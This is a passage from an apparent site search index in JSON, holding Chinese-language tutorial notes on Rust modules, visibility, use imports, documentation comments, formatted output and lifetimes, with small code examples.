package \u540c\u540d\u53ef\u6267\u884c\u6587\u4ef6\uff09\n\u2502   \u251c\u2500\u2500 lib.rs     // \u552f\u4e00\u5e93 crate\n\u2502   \u2514\u2500\u2500 bin        // \u5176\u4f59\u4e8c\u8fdb\u5236 crate\uff08\u5206\u522b\u751f\u6210\u6587\u4ef6\u540d\u540c\u540d\u53ef\u6267\u884c\u6587\u4ef6\uff09\n\u2502       \u2514\u2500\u2500 main1.rs\n\u2502       \u2514\u2500\u2500 main2.rs\n\u251c\u2500\u2500 tests     // \u96c6\u6210\u6d4b\u8bd5\n\u2502   \u2514\u2500\u2500 some_integration_tests.rs\n\u251c\u2500\u2500 benches   // \u57fa\u51c6\u6027\u80fd\u6d4b\u8bd5 benchmark \u6587\u4ef6\n\u2502   \u2514\u2500\u2500 simple_bench.rs\n\u2514\u2500\u2500 examples  // \u793a\u4f8b\n    \u2514\u2500\u2500 simple_example.rs\n</code></pre>"},{"location":"cs/pl/rust/basic/#module","title":"\u6a21\u5757 Module","text":"<ul> <li>\u5728 lib.rs \u4e2d\u4f7f\u7528 mod \u5173\u952e\u5b57\u521b\u5efa\u6a21\u5757\uff0c\u540e\u63a5\u6a21\u5757\u540d</li> <li>mod \u53ef\u4ee5\u5d4c\u5957\uff0c\u6a21\u5757\u4e2d\u53ef\u4ee5\u5b9a\u4e49\u5404\u79cd rust \u7c7b\u578b</li> <li>src/main.rs \u548c src/lib.rs \u79f0\u4e3a crate root</li> <li>\u6a21\u5757\u4f7f\u7528 :: \u9010\u7ea7\u8bbf\u95ee<ul> <li>crate \u6307\u6839\uff0c\u4f7f\u7528 crate \u4e5f\u5c31\u76f8\u5f53\u4e8e\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84</li> <li>super \u6307\u7236\u6a21\u5757\uff08\u4e0a\u4e00\u7ea7\uff09\uff0c\u76f8\u5f53\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684 ..</li> <li>self \u6307\u81ea\u8eab\u6a21\u5757</li> </ul> </li> </ul> <p>\u5982\u4e0b lib.rs\uff1a <pre><code>mod A {\n    mod B {\n        fn func_a() {\n            self::func_b();\n        }\n        fn func_b() {\n            super::C::func_c();\n        }\n    }\n    mod C {\n        fn func_c() {}\n    }\n}\npub fn func() {\n    crate::A::B::func_a(); // \u7edd\u5bf9\u8def\u5f84\u5f15\u7528\n    A::B::func_b();        // \u76f8\u5bf9\u8def\u5f84\u5f15\u7528\n    self::A::C::func_c();  \n}\n</code></pre> \u5b83\u7684\u6a21\u5757\u6811\u4e3a\uff1a <pre><code>crate\n  \u251c\u2500\u2500 func\n  \u2514\u2500\u2500 A\n      \u251c\u2500\u2500 B\n      \u2502   \u251c\u2500\u2500 func_a\n      \u2502   \u2514\u2500\u2500 func_b\n      \u2514\u2500\u2500 C\n          \u2514\u2500\u2500 func_c\n</code></pre></p> <ul> <li>\u4ec5\u4f7f\u7528 mod name; \u5c06\u521b\u5efa\u4e00\u4e2a\u6a21\u5757\uff0c\u5e76\u4ece\u540c\u76ee\u5f55\u4e0b\u540c\u540d\u7684 name.rs \u4e2d\u52a0\u8f7d\u6a21\u5757\u5185\u5bb9</li> </ul>"},{"location":"cs/pl/rust/basic/#_49","title":"\u4ee3\u7801\u53ef\u89c1\u6027","text":"<ul> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709\u7c7b\u578b\uff08\u51fd\u6570\u3001\u65b9\u6cd5\u3001\u7ed3\u6784\u4f53\u3001\u679a\u4e3e\u2026\u2026\uff09\u90fd\u662f\u79c1\u6709\u7684</li> <li>\u7236\u6a21\u5757\u65e0\u6cd5\u8bbf\u95ee\u5b50\u6a21\u5757\u4e2d\u7684\u79c1\u6709\u9879\uff0c\u800c\u5b50\u6a21\u5757\u53ef\u4ee5\u8bbf\u95ee\u7236\u6a21\u5757\u53ca\u66f4\u4e0a\u5c42\u7684\u6a21\u5757\u7684\u79c1\u6709\u9879</li> <li>\u4f7f\u7528 pub \u5173\u952e\u5b57\u5c06\u6a21\u5757\u3001\u51fd\u6570\u7b49\u6807\u4e3a\u5bf9\u5916\u53ef\u89c1\u7684</li> <li>\u7ed3\u6784\u4f53\u4e0e\u679a\u4e3e\u7684\u53ef\u89c1\u6027<ul> <li>\u4ec5\u5c06\u7ed3\u6784\u4f53\u8bbe\u7f6e\u4e3a pub\uff0c\u5176\u5185\u90e8\u6240\u6709\u5b57\u6bb5\u4ecd\u7136\u662f\u79c1\u6709\u7684</li> <li>\u4ec5\u5c06\u679a\u4e3e\u8bbe\u7f6e\u4e3a pub\uff0c\u5219\u5176\u5185\u90e8\u6240\u6709\u5b57\u6bb5\u90fd\u5bf9\u5916\u53ef\u89c1</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#use","title":"use \u5f15\u5165","text":"<ul> <li>\u4f7f\u7528 use \u5173\u952e\u5b57\u6765\u5f15\u5165\u6a21\u5757\u6216\u7c7b\u578b\uff0c\u6765\u7b80\u5316\u8c03\u7528</li> <li>\u8981\u907f\u514d\u540c\u540d\u8c03\u7528</li> <li>\u4f7f\u7528 as \u6765\u8bbe\u7f6e\u522b\u540d\u89e3\u51b3\u51b2\u7a81\u95ee\u9898\uff0c\u4f8b\u5982\uff1a     <pre><code>use std::fmt::Result;\nuse std::io::Result as IoResult;\n</code></pre></li> <li>\u5229\u7528 use \u5bfc\u51fa\uff0c\u5982\uff1a     <pre><code>mod A {\n    pub mod B {\n        pub fn func_b() {}\n    }\n}\npub use crate::A::B;\npub fn func() {\n    B::func_b();\n}\n</code></pre><ul> <li>\u4ece\u5916\u90e8\u8c03\u7528\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 B \u6a21\u5757</li> </ul> </li> <li>\u53ef\u4ee5\u4f7f\u7528 {} \u6765\u7b80\u5316     <pre><code>use std::collections::{\n    HashMap,\n    BTreeMap,\n    HashSet\n};\nuse std::{cmp::Ordering, io};\n</code></pre><ul> <li>{} \u4e2d\u53ef\u4ee5\u4f7f\u7528 self\uff1a     <pre><code>use std::io::{self, Write}\n// \u5373 use std::io \u4ee5\u53ca use std::io::Write\n</code></pre></li> </ul> </li> <li>\u4f7f\u7528 * \u5f15\u5165\u6a21\u5757\u4e0b\u6240\u6709\u516c\u5f00\u9879\uff0c\u5982 <code>use std::collections::*;</code>\uff0c\u4f46\u8981\u5c0f\u5fc3\u540d\u79f0\u51b2\u7a81</li> </ul>"},{"location":"cs/pl/rust/basic/#_50","title":"\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305","text":"<p>\u4f8b\u5982\u4f7f\u7528 rand \u5305\uff1a</p> <ol> <li>\u4fee\u6539 Cargo.toml\uff0c\u5728 [dependencies] \u4e2d\u6dfb\u52a0 rand = \"0.8.3\"</li> <li>\u5728\u4ee3\u7801\u4e2d\u4f7f\u7528 rand::... \u5373\u53ef     <pre><code>use rand::Rng; // trait\nfn main() {\n    let n = rand::thread_rng().gen_range(1..101);\n}\n</code></pre></li> </ol> <p>\u53ef\u4ee5\u5728 crates.io \u6216 lib.rs \u4e2d\u68c0\u7d22\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305</p>"},{"location":"cs/pl/rust/basic/#_51","title":"\u53d7\u9650\u53ef\u89c1\u6027","text":"<ul> <li><code>pub</code> \u8868\u793a\u65e0\u4efb\u4f55\u9650\u5236\u7684\u5b8c\u5168\u53ef\u89c1</li> <li><code>pub(crate)</code> \u8868\u793a\u5728\u5f53\u524d\u5305\u5185\u53ef\u89c1</li> <li><code>pub(self)</code> \u8868\u793a\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u53ef\u89c1</li> <li><code>pub(super)</code> \u8868\u793a\u5728\u7236\u6a21\u5757\u4e2d\u53ef\u89c1</li> <li><code>pub(in &lt;path&gt;)</code> \u8868\u793a\u5728 &lt;path&gt; \u4ee3\u8868\u7684\u6a21\u5757\u4e2d\u53ef\u89c1</li> </ul>"},{"location":"cs/pl/rust/basic/#_52","title":"\u4e09\u79cd\u6a21\u5757\u76ee\u5f55\u7ec4\u7ec7\u65b9\u5f0f","text":"<ul> <li>Rust 2015     <pre><code>.\n\u251c\u2500\u2500 lib.rs\n\u2514\u2500\u2500 foo/\n    \u251c\u2500\u2500 mod.rs\n    \u2514\u2500\u2500 bar.rs\n</code></pre><ul> <li>lib.rs \u4e2d mod foo; \u4f1a\u5f15\u5165 foo/mod.rs \u4e2d\u5185\u5bb9</li> <li>\u9700\u8981\u5728 foo/mod.rs \u4e2d\u7ee7\u7eed\u4e3a bar.rs \u521b\u5efa\u540c\u540d mod</li> </ul> </li> <li>Rust 2018     <pre><code>.\n\u251c\u2500\u2500 lib.rs\n\u251c\u2500\u2500 foo.rs\n\u2514\u2500\u2500 foo/\n    \u2514\u2500\u2500 bar.rs\n</code></pre><ul> <li>lib.rs \u4e2d mod foo; \u4f1a\u5f15\u5165 foo.rs</li> <li>\u5728 foo.rs \u4e2d mod bar;</li> <li>\u4e0e 2015 \u7684\u6a21\u5f0f\u76f8\u6bd4\u5c31\u76f8\u5f53\u4e8e\u5c06 mod.rs \u63d0\u5230\u6587\u4ef6\u5939\u5916\u7684\u540c\u540d\u6587\u4ef6\u4e86</li> </ul> </li> <li>\u4f7f\u7528 #[path = ...] \u521b\u5efa\u6a21\u5757\uff08\u614e\u7528\uff09     <pre><code>.\n\u251c\u2500\u2500 lib.rs       \n\u2514\u2500\u2500 pkg/        // \u4efb\u610f\n    \u251c\u2500\u2500 foo.rs\n    \u2514\u2500\u2500 bar.rs\n</code></pre><ul> <li>lib.rs \u4e2d\u5728 mod foo; \u524d\u6307\u5b9a\u8def\u5f84\uff1a     <pre><code>#[path = \"./pkg/foo.rs\"]\npub mod foo;\n\n#[path = \"./pkg/bar.rs\"]\npub mod bar;\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_53","title":"\u6ce8\u91ca\u4e0e\u6587\u6863","text":"<p>Rust \u4e2d\u6ce8\u91ca\u5206\u4e3a\u4e24\u7c7b\uff1a</p> <ul> <li>\u4ee3\u7801\u6ce8\u91ca\uff1a\u8bf4\u660e\u67d0\u4e00\u6bb5\u4ee3\u7801\u7684\u4f5c\u7528\uff08// \u884c\u6ce8\u91ca\u548c /* ... */ \u5757\u6ce8\u91ca\uff09</li> <li>\u6587\u6863\u6ce8\u91ca\uff1a\u4f7f\u7528 markdown \u8bed\u6cd5\uff0c\u63cf\u8ff0\u9879\u76ee\u3001\u4ecb\u7ecd\u529f\u80fd\u3001\u751f\u6210\u6587\u6863<ul> <li>\u5305\u548c\u6a21\u5757\u6ce8\u91ca\uff1a\u8bf4\u660e\u5f53\u524d\u5305\u548c\u6a21\u5757\u7684\u529f\u80fd</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_54","title":"\u6587\u6863\u6ce8\u91ca","text":"<ul> <li>\u6587\u6863\u884c\u6ce8\u91ca /// \u4e0e\u6587\u6863\u5757\u6ce8\u91ca /** ... */<ul> <li>\u6587\u6863\u6ce8\u91ca\u9700\u8981\u4f4d\u4e8e\u5e93\u7c7b\u578b\u7684 crate \u4e2d</li> <li>\u53ef\u4ee5\u4f7f\u7528 markdown \u8bed\u6cd5\uff0c\u4ee5\u53ca\u4ee3\u7801\u5757\u9ad8\u4eae\u663e\u793a</li> <li>\u5199\u5728\u88ab\u6ce8\u91ca\u7c7b\u578b\u4e0a\u65b9</li> <li>\u88ab\u6ce8\u91ca\u7684\u5bf9\u8c61\u9700\u8981 pub \u5bf9\u5916\u53ef\u89c1</li> <li>\u6587\u6863\u6ce8\u91ca\u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u591a\u4e2a\u4e00\u7ea7\u6807\u9898\uff0c\u5e38\u7528\u7684\u6709<ul> <li># Examples</li> <li># Panics\uff1a\u63cf\u8ff0\u51fd\u6570\u53ef\u80fd\u4f1a\u51fa\u73b0\u7684 panic \u60c5\u51b5</li> <li># Errors\uff1a\u63cf\u8ff0\u53ef\u80fd\u4f1a\u51fa\u73b0\u7684\u9519\u8bef\u4ee5\u53ca\u89e6\u53d1\u60c5\u51b5</li> <li># Safety\uff1aunsafe \u4ee3\u7801\u9700\u8981\u6ce8\u610f\u7684\u4f7f\u7528\u6761\u4ef6</li> </ul> </li> </ul> </li> <li>\u5305/\u6a21\u5757\u7ea7\u522b\u884c\u6ce8\u91ca //! \u4e0e\u5305/\u6a21\u5757\u7ea7\u522b\u5757\u6ce8\u91ca /*! ... */<ul> <li>\u5199\u5728 crate root \u7684\u6700\u4e0a\u65b9</li> </ul> </li> <li>\u4f7f\u7528 cargo doc \u6784\u5efa\u6587\u6863\uff0c\u751f\u6210\u5728 target/doc \u76ee\u5f55\u4e0b<ul> <li>\u4f7f\u7528 cargo doc --open \u6784\u5efa\u5e76\u6253\u5f00</li> </ul> </li> <li>\u6587\u6863\u6d4b\u8bd5<ul> <li>\u6587\u6863\u6ce8\u91ca\u4e2d\u7684\u4ee3\u7801\u5757\u53ef\u4ee5\u7528\u4f5c\u6d4b\u8bd5\uff0c\u76f4\u63a5\u5199 assert \u7b49\u5b8f\u5c31\u53ef\u4ee5</li> <li>\u4f7f\u7528 cargo test \u4f1a\u8fdb\u884c\u6d4b\u8bd5\uff0c\u5e76\u663e\u793a \"Doc-tests ...\"</li> <li>\u9884\u671f\u4f1a\u9020\u6210 panic \u7b49\u4ee3\u7801\u5757\u9700\u8981\u5728\u4ee3\u7801\u5757\u8bed\u8a00\u540e\u52a0\u4e0a should_panic\uff1a     <pre><code>/// # Panics\n/// \n/// ```rust,should_panic\n/// ...\n/// ```\n</code></pre></li> <li>\u4ec5\u6d4b\u8bd5\uff0c\u4e0d\u663e\u793a\u5728\u6587\u6863\u4e2d\u7684\u884c\u5f00\u5934\u52a0 # \u5c31\u53ef\u4ee5\uff1a     <pre><code>/// ```\n/// # fn try_main() -&gt; Result&lt;(), String&gt; {\n/// let res = ...::func()?;\n/// #     Ok(())\n/// # }\n/// # fn main() {\n/// #     try_main().unwrap();\n/// # }\n</code></pre><ul> <li>\u5982\u4e0a\u8ff0\u4f8b\u5b50\uff0c\u6700\u7ec8\u5728\u6587\u6863\u4e2d\u53ea\u4f1a\u663e\u793a let \u90a3\u4e00\u884c\uff0c\u4f46\u5728\u8fdb\u884c doc-test \u65f6\u5168\u90e8\u4ee3\u7801\u90fd\u4f1a\u8fd0\u884c</li> </ul> </li> </ul> </li> <li>\u4ee3\u7801\u8df3\u8f6c\uff08\u81ea\u52a8\u94fe\u63a5\uff09<ul> <li>\u6587\u6863\u4e2d\u5199 [`Option`] \u4f1a\u5728\u6587\u6863\u4e2d\u521b\u5efa\u4e00\u4e2a\u6307\u5411\u6807\u51c6\u5e93\u4e2d Option \u7c7b\u578b\u7684\u94fe\u63a5</li> <li>\u4e5f\u53ef\u4ee5\u6307\u5b9a\u5177\u4f53\u7684\u8def\u5f84\u6765\u521b\u5efa\u6307\u5411\u81ea\u5df1\u4ee3\u7801\u6216\u5176\u5b83\u5e93\u4e2d\u6307\u5b9a\u9879\u7684\u94fe\u63a5</li> <li>\u540c\u540d\u9879\u53ef\u4ee5\u6807\u793a\u7c7b\u578b\uff1a     <pre><code>/// \u8df3\u8f6c\u5230\u7ed3\u6784\u4f53  [`Foo`](struct@Foo)\npub struct Bar;\n\n/// \u8df3\u8f6c\u5230\u540c\u540d\u51fd\u6570 [`Foo`](fn@Foo)\npub struct Foo {}\n\n/// \u8df3\u8f6c\u5230\u540c\u540d\u5b8f [`foo!`]\npub fn Foo() {}\n\n#[macro_export]\nmacro_rules! foo {\n  () =&gt; {}\n}\n</code></pre></li> </ul> </li> <li>\u6587\u6863\u641c\u7d22\u522b\u540d     <pre><code>#[doc(alias = \"x\")]\n#[doc(alias = \"big\")]\npub struct BigX;\n\n#[doc(alias(\"y\", \"big\"))]\npub struct BigY;\n</code></pre><ul> <li>\u5982\u4e0a\u4ee3\u7801\uff0c\u5728\u6587\u6863\u4e2d\u641c\u7d22\u7684\u65f6\u5019\uff0c\u641c\u7d22 x \u5c31\u4f1a\u547d\u4e2d BigX</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_55","title":"\u683c\u5f0f\u5316\u8f93\u51fa","text":"<p>Rust \u7684\u683c\u5f0f\u5316\u5c31\u6bd4\u8f83\u7c7b\u4f3c\u4e8e python \u7684 format \u4e86</p> <ul> <li>\u683c\u5f0f\u5316\u5b8f<ul> <li>print!\uff1a\u683c\u5f0f\u5316\u6587\u672c\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u4e0d\u6362\u884c</li> <li>println!\uff1a\u683c\u5f0f\u5316\u6587\u672c\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u6362\u884c</li> <li>format!\uff1a\u683c\u5f0f\u5316\u6587\u672c\uff0c\u8fd4\u56de String</li> <li>eprint! \u4e0e eprintln!\uff1a\u683c\u5f0f\u5316\u5230\u6807\u51c6\u9519\u8bef\u8f93\u51fa</li> </ul> </li> <li>\u5360\u4f4d\u7b26<ul> <li>{} \u9002\u7528\u4e8e\u5b9e\u73b0\u4e86 std::fmt::Display trait \u7684\u7c7b\u578b\uff0c\u7528\u4e8e\u5c55\u793a\u7ed9\u7528\u6237</li> <li>{:?} \u9002\u7528\u4e8e\u5b9e\u73b0\u4e86 std::fmt::Debug trait \u7684\u7c7b\u578b\uff0c\u7528\u4e8e\u8c03\u8bd5</li> <li>{:#?} \u540c\u4e0a\uff0c\u4e0d\u8fc7\u663e\u793a\u66f4\u4f18\u7f8e\uff08\u81ea\u52a8\u6362\u884c\u4e00\u7c7b\uff09</li> </ul> </li> <li>\u5b9e\u73b0 Display trait     <pre><code>use std::fmt;\nimpl fmt::Display for ... {\n    fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result {\n        write!(f, \"...{}...\", ...)\n    }\n}\n</code></pre><ul> <li>\u53ea\u80fd\u4e3a\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u7684\u7c7b\u578b\u5b9e\u73b0 Display trait</li> <li>\u4e3a\u5916\u90e8\u7c7b\u578b\u5b9e\u73b0 Display \u53ef\u4ee5\u4f7f\u7528 newtype \u6a21\u5f0f</li> </ul> </li> <li>\u4f4d\u7f6e\u53c2\u6570     <pre><code>fn main() {\n    println!(\"{}{}\", 1, 2); // =&gt;\"12\"\n    println!(\"{1}{0}\", 1, 2); // =&gt;\"21\"\n    // =&gt; Alice, this is Bob. Bob, this is Alice\n    println!(\"{0}, this is {1}. {1}, this is {0}\", \"Alice\", \"Bob\");\n    println!(\"{1}{}{0}{}\", 1, 2); // =&gt; 2112\n}\n</code></pre><ul> <li>\u5bf9\u4e8e {:?} \u6216 {:#?}\uff0c\u5c06\u4f4d\u7f6e\u53c2\u6570\u52a0\u5728\u5192\u53f7\u524d\u5c31\u53ef\u4ee5</li> </ul> </li> <li>\u5177\u540d\u53c2\u6570     <pre><code>fn main() {\n    println!(\"{argument}\", argument = \"test\"); // =&gt; \"test\"\n    println!(\"{name} {}\", 1, name = 2); // =&gt; \"2 1\"\n    println!(\"{a} {c} {b}\", a = \"a\", b = 'b', c = 3); // =&gt; \"a 3 b\"\n}\n</code></pre><ul> <li>\u5e26\u540d\u79f0\u7684\u53c2\u6570\u53ea\u80fd\u653e\u5728\u4e0d\u5e26\u540d\u79f0\u7684\u540e\u9762</li> </ul> </li> <li>\u683c\u5f0f\u5316\u53c2\u6570<ul> <li>\u5bbd\u5ea6\u586b\u5145<ul> <li>\u5b57\u7b26\u4e32     <pre><code>//-----------------------------------\n// \u4ee5\u4e0b\u5168\u90e8\u8f93\u51fa \"Hello x    !\"\n// \u4e3a\"x\"\u540e\u9762\u586b\u5145\u7a7a\u683c\uff0c\u8865\u9f50\u5bbd\u5ea65\nprintln!(\"Hello {:5}!\", \"x\");\n// \u4f7f\u7528\u53c2\u65705\u6765\u6307\u5b9a\u5bbd\u5ea6\nprintln!(\"Hello {:1$}!\", \"x\", 5);\n// \u4f7f\u7528x\u4f5c\u4e3a\u5360\u4f4d\u7b26\u8f93\u51fa\u5185\u5bb9\uff0c\u540c\u65f6\u4f7f\u75285\u4f5c\u4e3a\u5bbd\u5ea6\nprintln!(\"Hello {1:0$}!\", 5, \"x\");\n// \u4f7f\u7528\u6709\u540d\u79f0\u7684\u53c2\u6570\u4f5c\u4e3a\u5bbd\u5ea6\nprintln!(\"Hello {:width$}!\", \"x\", width = 5);\n//-----------------------------------\n\n// \u4f7f\u7528\u53c2\u65705\u4e3a\u53c2\u6570x\u6307\u5b9a\u5bbd\u5ea6\uff0c\u540c\u65f6\u5728\u7ed3\u5c3e\u8f93\u51fa\u53c2\u65705 =&gt; Hello x    !5\nprintln!(\"Hello {:1$}!{}\", \"x\", 5);\n</code></pre></li> <li>\u6570\u5b57     <pre><code>// \u5bbd\u5ea6\u662f5 =&gt; Hello     5!\nprintln!(\"Hello {:5}!\", 5);\n// \u663e\u5f0f\u7684\u8f93\u51fa\u6b63\u53f7 =&gt; Hello +5!\nprintln!(\"Hello {:+}!\", 5);\n// \u5bbd\u5ea65\uff0c\u4f7f\u75280\u8fdb\u884c\u586b\u5145 =&gt; Hello 00005!\nprintln!(\"Hello {:05}!\", 5);\n// \u8d1f\u53f7\u4e5f\u8981\u5360\u7528\u4e00\u4f4d\u5bbd\u5ea6 =&gt; Hello -0005!\nprintln!(\"Hello {:05}!\", -5);\n</code></pre></li> <li>\u5bf9\u9f50     <pre><code>// \u4ee5\u4e0b\u5168\u90e8\u90fd\u4f1a\u8865\u9f505\u4e2a\u5b57\u7b26\u7684\u957f\u5ea6\n// \u5de6\u5bf9\u9f50 =&gt; Hello x    !\nprintln!(\"Hello {:&lt;5}!\", \"x\");\n// \u53f3\u5bf9\u9f50 =&gt; Hello     x!\nprintln!(\"Hello {:&gt;5}!\", \"x\");\n// \u5c45\u4e2d\u5bf9\u9f50 =&gt; Hello   x  !\nprintln!(\"Hello {:^5}!\", \"x\");\n\n// \u5bf9\u9f50\u5e76\u4f7f\u7528\u6307\u5b9a\u7b26\u53f7\u586b\u5145 =&gt; Hello x&amp;&amp;&amp;&amp;!\n// \u6307\u5b9a\u7b26\u53f7\u586b\u5145\u7684\u524d\u63d0\u6761\u4ef6\u662f\u5fc5\u987b\u6709\u5bf9\u9f50\u5b57\u7b26\nprintln!(\"Hello {:&amp;&lt;5}!\", \"x\");\n</code></pre></li> </ul> </li> <li>\u7cbe\u5ea6     <pre><code>let v = 3.1415926;\n// \u4fdd\u7559\u5c0f\u6570\u70b9\u540e\u4e24\u4f4d =&gt; 3.14\nprintln!(\"{:.2}\", v);\n// \u5e26\u7b26\u53f7\u4fdd\u7559\u5c0f\u6570\u70b9\u540e\u4e24\u4f4d =&gt; +3.14\nprintln!(\"{:+.2}\", v);\n// \u4e0d\u5e26\u5c0f\u6570 =&gt; 3\nprintln!(\"{:.0}\", v);\n// \u901a\u8fc7\u53c2\u6570\u6765\u8bbe\u5b9a\u7cbe\u5ea6 =&gt; 3.1416\uff0c\u76f8\u5f53\u4e8e{:.4}\nprintln!(\"{:.1$}\", v, 4);\n\nlet s = \"abcded\";\n// \u4fdd\u7559\u5b57\u7b26\u4e32\u524d\u4e09\u4e2a\u5b57\u7b26 =&gt; abc\nprintln!(\"{:.3}\", s);\n// {:.*}\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u7cbe\u5ea6\uff0c\u7b2c\u4e8c\u4e2a\u662f\u88ab\u683c\u5f0f\u5316\u7684\u503c =&gt; Hello abc!\nprintln!(\"Hello {:.*}!\", 3, \"abcdefg\");\n</code></pre></li> <li>\u8fdb\u5236     <pre><code>// \u4e8c\u8fdb\u5236 =&gt; 0b11011!\nprintln!(\"{:#b}!\", 27);\n// \u516b\u8fdb\u5236 =&gt; 0o33!\nprintln!(\"{:#o}!\", 27);\n// \u5341\u8fdb\u5236 =&gt; 27!\nprintln!(\"{}!\", 27);\n// \u5c0f\u5199\u5341\u516d\u8fdb\u5236 =&gt; 0x1b!\nprintln!(\"{:#x}!\", 27);\n// \u5927\u5199\u5341\u516d\u8fdb\u5236 =&gt; 0x1B!\nprintln!(\"{:#X}!\", 27);\n\n// \u4e0d\u5e26\u524d\u7f00\u7684\u5341\u516d\u8fdb\u5236 =&gt; 1b!\nprintln!(\"{:x}!\", 27);\n\n// \u4f7f\u75280\u586b\u5145\u4e8c\u8fdb\u5236\uff0c\u5bbd\u5ea6\u4e3a10 =&gt; 0b00011011!\nprintln!(\"{:#010b}!\", 27);\n</code></pre></li> <li>\u6307\u6570     <pre><code>println!(\"{:2e}\", 1000000000); // =&gt; 1e9\nprintln!(\"{:2E}\", 1000000000); // =&gt; 1E9\n</code></pre></li> <li>\u6307\u9488\u5730\u5740     <pre><code>let v = vec![1, 2, 3];\nprintln!(\"{:p}\", v.as_ptr()) // =&gt; 0x600002324050\n</code></pre></li> <li>\u8f93\u51fa { \u6216 } \u8981\u5199\u4e24\u6b21\u8fdb\u884c\u8f6c\u4e49</li> </ul> </li> <li>1.58 \u4e2d\u65b0\u589e\u6355\u83b7\u73af\u5883\u503c<ul> <li>\u7c7b\u4f3c python \u4e2d\u7684 f-string\uff0c\u4e0d\u8fc7\u4e0d\u9700\u8981\u7279\u6b8a\u6807\u6ce8</li> <li>\u6355\u83b7\u53d8\u91cf\u53ef\u4ee5\u66ff\u6362\u5728\u4efb\u4f55\u4f4d\u7f6e     <pre><code>let (width, precision) = get_format();\nfor (name, score) in get_scores() {\n    println!(\"{name}: {score:width$.precision$}\");\n}\n</code></pre></li> <li>panic! \u5728 2021 \u7248\u672c\u4e0b\u624d\u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_56","title":"\u751f\u547d\u5468\u671f","text":"<ul> <li>\u5b58\u5728\u591a\u4e2a\u5f15\u7528\u65f6\uff0c\u7f16\u8bd1\u5668\u6709\u65f6\u4f1a\u65e0\u6cd5\u81ea\u52a8\u63a8\u5bfc\u751f\u547d\u5468\u671f\uff0c\u9700\u8981\u624b\u52a8\u6807\u6ce8</li> <li>\u751f\u547d\u5468\u671f\u662f\u4e3a\u7f16\u8bd1\u5668\u800c\u6807\u6ce8\uff0c\u5e76\u4e0d\u4f1a\u6539\u53d8\u4efb\u4f55\u5f15\u7528\u7684\u5b9e\u9645\u4f5c\u7528\u57df</li> <li>\u751f\u547d\u5468\u671f\u4ee5 ' \u5f00\u5934\uff0c\u540d\u79f0\u5f80\u5f80\u662f\u5355\u72ec\u7684\u5c0f\u5199\u5b57\u6bcd\uff08\u5982 <code>'a</code>\uff09     <pre><code>&amp;i32        // i32 \u7c7b\u578b\u7684\u5f15\u7528\n&amp;'a i32     // \u5e26\u6709\u663e\u793a\u751f\u547d\u5468\u671f 'a \u7684 i32 \u5f15\u7528\n&amp;'a mut i32 // \u5e26\u6709\u663e\u793a\u751f\u547d\u5468\u671f 'a \u7684 i32 \u53ef\u53d8\u5f15\u7528\n</code></pre></li> <li>\u51fd\u6570\u7b7e\u540d\u4e2d\u4f7f\u7528\u751f\u547d\u5468\u671f\u9700\u8981\u5148\u50cf\u6cdb\u578b\u4e00\u6837\u58f0\u660e     <pre><code>fn func&lt;'a&gt;(x: &amp;'a str, y: &amp;'a str) -&gt; &amp;'a str {}\n</code></pre><ul> <li>\u8868\u793a\u4e24\u4e2a\u53c2\u6570\u4ee5\u53ca\u8fd4\u56de\u5f15\u7528\u81f3\u5c11\u548c 'a \u6d3b\u5f97\u4e00\u6837\u4e45</li> <li>\u4e24\u4e2a\u53c2\u6570\u7684\u771f\u5b9e\u751f\u547d\u5468\u671f\u53ef\u80fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u53ea\u9700\u8981\u4e0d\u5c0f\u4e8e 'a \u5c31\u53ef\u4ee5</li> <li>\u8c03\u7528\u7684\u65f6\u5019\u4e0d\u5fc5\u6807\u6ce8\u751f\u547d\u5468\u671f</li> </ul> </li> <li>\u751f\u547d\u5468\u671f\u8bed\u6cd5\u7528\u6765\u5c06\u51fd\u6570\u7684\u591a\u4e2a\u5f15\u7528\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u4f5c\u7528\u57df\u5173\u8054\u5230\u4e00\u8d77\uff0c\u907f\u514d\u4e86\u60ac\u5782\u5f15\u7528<ul> <li>\u8fd4\u56de\u503c\u662f\u5f15\u7528\u65f6\uff0c\u5176\u751f\u547d\u5468\u671f\u53ea\u80fd\u6765\u81ea\u53c2\u6570\uff0c\u6765\u81ea\u51fd\u6570\u4f53\u5185\u90e8\u7684\u8bdd\u5c31\u662f\u60ac\u5782\u5f15\u7528</li> </ul> </li> <li>\u7ed3\u6784\u4f53\u4e2d\u751f\u547d\u5468\u671f<ul> <li>\u7ed3\u6784\u4f53\u4e2d\u4f7f\u7528\u751f\u547d\u5468\u671f\u53ef\u4ee5\u4fdd\u8bc1\u5185\u90e8\u5f15\u7528\u7c7b\u578b\u7684\u53c2\u6570\u6d3b\u5f97\u6bd4\u7ed3\u6784\u4f53\u672c\u8eab\u957f     <pre><code>struct MyStruct&lt;'a&gt; {\n    string: &amp;'a str,\n}\n</code></pre></li> <li>\u5982\u4e0b\u4f8b\u5373\u662f\u7ed3\u6784\u4f53\u83b7\u5f97\u6bd4\u5185\u90e8\u53c2\u6570\u957f\uff0c\u4f1a\u62a5\u9519\uff1a     <pre><code>let i;\n{\n    let string = String::from(\"test\");\n    i = MyStruct {\n        string: string.as_str()\n    };\n}\nprintln!(\"{:?}\", i);\n</code></pre></li> </ul> </li> <li>\u751f\u547d\u5468\u671f\u6d88\u9664<ul> 